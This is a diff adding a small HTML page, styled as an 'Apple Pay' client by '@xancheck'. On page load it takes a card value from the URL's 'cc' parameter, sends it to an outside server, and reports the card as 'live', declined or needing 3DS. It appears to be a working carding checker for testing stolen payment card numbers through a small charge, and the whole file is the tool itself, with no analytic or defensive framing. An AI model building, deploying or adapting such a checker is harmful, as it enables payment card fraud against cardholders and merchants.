@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple API Client</title>
+</head>
+<body>
+
+    <h1>Apple Pay by @xancheck</h1>
+
+    <script>
+        function sendRequest() {
+
+            var urlParams = new URLSearchParams(window.location.search);
+            var inputData = urlParams.get('cc');
+
+            if (!inputData) {
+                alert("Error: No data provided in the 'cc' parameter.");
+                return;
+            }
+
+            var payload = {
+                data: inputData
+            };
+
+            var payloadString = JSON.stringify(payload);
+
+
+            fetch('https://binsearcher.info/api.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: payloadString,
+            })
+            .then(response => response.json())
+            .then(data => {
+
+                if (data.status === "live") {
+                    alert("Approved 1$ " + data.data);
+                } else if (data.status === "die") {
+                    alert("Declined " + data.data);
+                } else if (data.status === "unknown") {
+                    alert("#3DS " + data.data);
+                }
+            })
+            .catch(error => {
+
+                alert("Error: Unable to send request.");
+            });
+        }
+
+
+        sendRequest();
+    </script>
+
+</body>
+</html>
